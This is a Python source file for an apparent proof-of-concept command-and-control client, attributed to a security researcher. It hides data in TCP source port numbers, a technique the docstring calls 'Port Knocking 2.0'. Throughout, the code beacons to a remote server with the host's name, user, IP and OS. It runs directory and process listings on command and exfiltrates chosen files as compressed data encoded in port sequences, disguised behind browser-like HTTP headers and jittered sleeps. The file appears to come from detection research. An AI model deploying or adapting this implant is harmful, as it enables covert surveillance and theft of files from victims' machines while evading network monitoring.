"""
    saucepot-client.py
    ~~~~~~~~~~~~~~~~~~

    A client establishes a C2 channel via ephemeral ports to the remote server. The supported C2 features include:

        - Check-in / heartbeat
        - Directory listing
        - Process listing
        - File upload

    Note that this is a proof-of-concept of ephemeral port abusing along with source port knocking, coined 
    "Port Knocking 2.0". The implementation of C2 commands is limited, such as the lack of flexibility in 
    the 'ls' and 'upload' commands.

    :copyright: (c) 2023 Netskope Inc. All rights reserved.
    :author: Hubert Lin (July, 2023)
"""

import argparse
import base64
import json
import lzma
import os
import psutil
import pycurl
import random
import re
import socket
import stat
import sys
import time
import uuid
from datetime import datetime, timedelta
from io import BytesIO
from tqdm import tqdm


# hostname and 6-byte uuid
hostname = socket.gethostname()
hostuuid = f'{uuid.getnode():012x}'

# Destination host and port
dhost = '127.0.0.1'
dport = 80

# Beacon sleep time and jitter in seconds
sleep = 15
jitter = 3

# file to exfiltrate
exfil_filename = None

"""
Port range for data transfer: The capacity (x60) primarily serves to accommodate situations where a port is
temporarily or permanently occupied by other apps or processes. States affecting port availability include,
but are not limited to:
    - LISTEN
    - ESTABLISHED
    - FIN_WAIT1, FIN_WAIT2
    - TIME_WAIT
"""
start_port = 49000
end_port   = start_port + 256*60 -1

# Port knocking sequences. All elements in a list must be unique
knocks = {
    'session-start': [32400, 32500, 32600],
    'session-end'  : [29900, 29800, 29700],
}

# port info of last accessed
portinf = {}

def send_pkt(host:str, dport:int, sports:list):
    """send list of source port sequence to destination host:port"""
    global start_port
    global end_port
    global portinf
    global c2_commands
    global c2_task_id
    global c2_command_idx

    proximity_tolerance = 3

    buffer = BytesIO()
    http_headers = [
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language: en-US,en;q=0.9',
    ]

    for p in tqdm(sports, mininterval=1, disable=(len(sports)<=5)):
        if p > end_port:
            printmsg(f"Warning! {p} is beyond data port range (> {end_port})")

        # Sleep for at least 60 secs for the TCP connection to completely close
        while datetime.utcnow() - portinf[p] <= timedelta(seconds=65):
            if start_port <= p <= end_port:
                p += 256

                if p > end_port:
                    p = ((p-start_port)%256) + start_port
                    printmsg(f'Sleep for 10 secs...  {p=}')
                    time.sleep(10)
            else:
                for _, knock_seqs in knocks.items():
                    seq_index = within_knock_sequences(knock_seqs, p, tolerance=proximity_tolerance)

                    if seq_index >=0 and 0 <= (p - knock_seqs[seq_index]) < proximity_tolerance:
                        p += 1

                        if p - knock_seqs[seq_index] > proximity_tolerance:
                            p = knock_seqs[seq_index]
                            printmsg(f'Sleep for 10 secs ...  {p=}')
                            time.sleep(10)

        portinf[p] = datetime.utcnow()

        c = pycurl.Curl()
        c.setopt(pycurl.URL, f'http://{host}:{dport}/chk-version')
        c.setopt(pycurl.HTTPHEADER, http_headers)
        c.setopt(pycurl.WRITEDATA, buffer)
        c.setopt(pycurl.TCP_KEEPALIVE, False)
        c.setopt(pycurl.TIMEOUT, 10)
        c.setopt(pycurl.LOCALPORT, p)

        # Include response headers
        c.setopt(pycurl.HEADER, True)

        try:
            c.perform()

            # Get the response headers
            header_size = c.getinfo(pycurl.HEADER_SIZE)
            resp_headers = buffer.getvalue()[:header_size].decode('utf-8')

            for hdr in resp_headers.split('\r\n'):
                if 'Last-Modified:' in hdr:
                    last_modified = datetime.strptime(hdr.split(': ')[1], '%a, %d %b %Y %H:%M:%S %Z')
                    c2_task_id = int(last_modified.timestamp())
                    c2_command_idx = c2_task_id % len(c2_commands)
                    break
        except pycurl.error as e:
            #printmsg(f"Exception: {e}  localport: {p} 0x{(p-start_port)%256:02x},  portinf[p]={portinf[p].strftime('%Y-%m-%d %H:%M:%S')}")
            if 'Address already in use' in str(e):
                if start_port <= p <= end_port-256:
                    send_pkt(host, dport, [p+256])
                else:
                    printmsg(f'Ephemeral port {p} not available. Incremental trial in progress...')
                    time.sleep(3)
                    printmsg(f'Trying port {p+1} ...')
                    send_pkt(host, dport, [p+1])
            elif e.args[0] != pycurl.E_COULDNT_CONNECT:
                print(f'Exception: {e}')

        c.close()

        # Packets must be received in order. Data corruption occurs when data is received out of order.
        time.sleep(0.05)


def knock_n_send(data:dict):
    """Wrapper function to knock-and-send data"""
    send_pkt(dhost, dport, knocks['session-start'])
    send_pkt(dhost, dport, [x + start_port for x in list(lzma.compress(json.dumps(data).encode('utf-8')))])
    send_pkt(dhost, dport, knocks['session-end'])


def within_knock_sequences(seqs:list, port:int, tolerance=3) -> int:
    """Check if the specified port is in the proximity of a knock sequence list"""
    for i in seqs:
        if abs(port - i) <= tolerance:
            return seqs.index(i)

    return -1


def parse_args():
    global dhost
    global dport
    global exfil_filename

    parser = argparse.ArgumentParser()
    parser.add_argument('-d', '--dst',
                        default=dhost,
                        metavar='<destination_host>',
                        help='Destination server to connect to (default: %(default)s)')
    parser.add_argument('-p', '--port',
                        default=dport,
                        metavar='<destination_port>',
                        help='Destination port to connect to (default: %(default)s)')
    parser.add_argument('-c', '--check',
                        action='store_true',
                        help='Check if the server sees the ephemeral port specified by the client')
    parser.add_argument('-u', '--upload',
                        metavar='<file>',
                        help='Upload the file specified directly, without retrieving C2 commands')
    args = parser.parse_args()

    if args.dst:
        dhost = args.dst
    if args.port:
        dport = args.port
    if args.upload:
        exfil_filename = args.upload
    if args.check:
        if check_ephemeral_port():
            print('\nEphemeral port test succeeded. Enjoy Port Knocking 2.0 technique!')
        else:
            print('\nEphemeral port test FAILED.')
        exit(0)

    return


def printmsg(msg):
    """Print messages with current timestamps prepended"""
    print(f'{datetime.utcnow().strftime("[%Y-%m-%d %H:%M:%S]")} {msg}')


def upload_file(task_id:int):
    """Upload file to the C2 server"""
    global exfil_filename

    with open(exfil_filename, 'rb') as f:
        filedata = f.read()

    data = {
        'id': task_id,
        'cmd': 'upload',
        'uuid': hostuuid,
        'hostname': hostname,
        'filename': exfil_filename,
        'payload': base64.b64encode(filedata).decode('utf-8')
    }

    knock_n_send(data)


def checkin():
    """Beacon check-in with various system info"""
    global hostname

    # Get the local IP address associated with the default gateway
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()

    data = {
        'cmd': 'chkin',
        'payload': {
            'Hostname': hostname,
            'Username': os.getlogin(),
            'IP': ip,
            'OS': get_os(),
            'UUID': hostuuid,
        }
    }

    knock_n_send(data)


def get_os():
    """Get OS info"""
    if sys.platform.lower().startswith('linux'):
        return 'Linux'
    elif sys.platform.lower().startswith('darwin'):
        return 'macOS'
    elif sys.platform.lower().startswith('win'):
        return 'Windows'
    else:
        return 'N/A'


def list_process(task_id:int):
    """Get process information for all running processes"""
    processes = psutil.process_iter(attrs=['pid', 'name', 'username', 'cpu_percent', 'memory_percent', 'status', 'cmdline'])
    output = f"{'USER':<10} {'PID':>7} {'%CPU':>4} {'%MEM':>4} {'STAT':>10} {'COMMAND'}\n"

    for process in processes:
        try:
            pid = process.info['pid']
            user = process.info['username']
            status = process.info['status']
            cpu = 0 if process.info['cpu_percent'] == None else process.info['cpu_percent']
            memory = 0 if process.info['memory_percent'] == None else process.info['memory_percent']
            cmdline = ' '.join(process.info['cmdline']) if process.info['cmdline'] else ''

            command = cmdline if cmdline else process.info['name']
            output += f'{user:<10} {pid:>7} {cpu:>4.1f} {memory:>4.1f} {status:>10} {command}\n'

        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

    data = {
        'id': task_id,
        'cmd': 'ps',
        'hostname': hostname,
        'payload': output,
    }

    knock_n_send(data)


def list_dir(task_id:int, dir='.'):
    """List directory contents"""
    output = ''

    for filename in sorted(os.listdir(dir)):
        filepath = os.path.join(dir, filename)
        statinf = os.stat(filepath)
        mode = statinf.st_mode
        size = statinf.st_size
        last_modified = datetime.utcfromtimestamp(statinf.st_mtime).strftime('%Y-%m-%d %H:%M')
        is_directory = stat.S_ISDIR(mode)
        permissions = stat.filemode(mode)

        if is_directory:
            filename += '/'

        output += f'{permissions} {size:>8} {last_modified} {filename}\n'

    data = {
        'id': task_id,
        'cmd': 'ls',
        'hostname': hostname,
        'payload': output,
    }

    knock_n_send(data)


def no_op(task_id:int):
    """No Operation"""
    pass


# id and index to the c2 command to run
c2_task_id = 0
c2_command_idx = 0

# Supported C2 features
c2_commands = [
    no_op,
    list_dir,
    list_process,
    upload_file,
]


def check_ephemeral_port() -> bool:
    """Check if the server sees the ephemeral port specified by the client"""
    global dhost
    global dport

    start_port = 50_000
    end_port = 65_000
    tries = 3
    success_cnt = 0

    print(f'Testing ephemeral port with {dhost}:{dport} ...')

    for i in range(tries):
        local_port = random.randint(start_port, end_port)
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.bind(('', int(local_port)))
            client_socket.connect((dhost, int(dport)))

            # Use the current timestamp as the challenge
            challenge = f'duel_{datetime.utcnow().timestamp()}'

            client_socket.send(f'{challenge}'.encode('utf-8'))
            data = client_socket.recv(1024).decode('utf-8')
            time.sleep(0.01)
        except ConnectionRefusedError as e:
            print('Connection refused. Is the server running?')
            exit(1)

        # Sample: duel_1689991210.429731 11.22.33.44:5000 -> 40.30.20.10:80
        match = re.search(f'^{challenge}' + r' \d+\.\d+\.\d+\.\d+:(\d+) -> \d+\.\d+\.\d+\.\d+:\d+$', data)

        if match:
            if int(match.group(1)) == local_port:
                success_cnt += 1
                print(f'Test {i+1} with ephemeral port {local_port}: PASS')
            else:
                print(f'Test {i+1} with ephemeral port {local_port}: FAIL')
        else:
            print("Invalid response format received")

        client_socket.close()

    return True if success_cnt == tries else False


def main():
    global exfil_filename
    global start_port
    global portinf
    global c2_task_id
    global c2_command_idx

    for i in range(1024, 65536):
        portinf[i] = datetime.strptime('2023-01-01', '%Y-%m-%d')

    parse_args()

    if exfil_filename:
        printmsg(f'Exfiltrating file {exfil_filename} ...')
        upload_file(int(datetime.utcnow().timestamp()))
        exit(0)

    while True:
        checkin()

        if c2_command_idx:
            printmsg(f"C2 command \"{str(c2_commands[c2_command_idx]).split(' ')[1]}\" received")
            c2_commands[c2_command_idx](c2_task_id)
            c2_task_id = 0
            c2_command_idx = 0

        sleeptime = sleep + random.randint(0, jitter)
        printmsg(f'Sleeping for {sleeptime} seconds ...')
        time.sleep(sleeptime)


if __name__ == "__main__":
    main()